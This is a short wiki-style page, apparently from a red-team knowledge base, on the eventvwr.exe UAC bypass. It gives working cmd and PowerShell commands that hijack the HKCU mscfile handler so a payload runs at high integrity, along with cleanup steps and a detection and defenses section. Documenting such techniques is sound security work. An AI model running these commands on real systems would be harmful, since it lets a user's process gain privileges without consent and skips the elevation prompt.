# UAC Bypass via eventvwr

`eventvwr.exe` (Event Viewer) is the original auto-elevate UAC bypass, disclosed by enigma0x3 in 2016. On launch it auto-elevates and opens an MMC snap-in by reading the `mscfile` protocol handler — from `HKCU` first. A medium-integrity administrator registers a malicious `mscfile\shell\open\command`, runs `eventvwr.exe`, and the payload executes at high integrity with no prompt. Microsoft later hardened Event Viewer, so this works on older Windows 10 builds; on current builds prefer [UAC Bypass via fodhelper](UAC-Bypass-via-fodhelper.md).

## Requirements

- Member of local Administrators, running at **Medium** integrity.
- Windows 7 / 8 / early Windows 10 (pre-hardening).

## Exploitation

```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\Windows\Temp\payload.exe" /f
eventvwr.exe
```

PowerShell equivalent:

```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c start powershell -Verb runAs" -Force
Start-Process "C:\Windows\System32\eventvwr.exe"
```

Confirm and clean up:

```cmd
whoami /groups | findstr /i "High"
reg delete "HKCU\Software\Classes\mscfile" /f
```

## Detection and defenses

- **Detection:** creation of `HKCU\Software\Classes\mscfile\shell\open\command`, `eventvwr.exe` spawning a shell (Sysmon 12/13 + 1) — a well-known, high-signal IOC.
- **Defenses:** UAC "Always notify"; patch to a build where Event Viewer no longer reads HKCU; remove standing admin rights.

## Related
- [UAC Bypass](UAC-Bypass.md) — folder hub and the auto-elevate pattern
- [UAC Bypass via fodhelper](UAC-Bypass-via-fodhelper.md) — the modern replacement
- [Registry Exploitation Techniques](../Registry-Exploitation/Registry-Exploitation-Techniques.md) — registry-hijack mechanics
- [Autorun Registry Persistence](../Registry-Exploitation/Autorun-Registry-Persistence.md) — related HKCU registry abuse
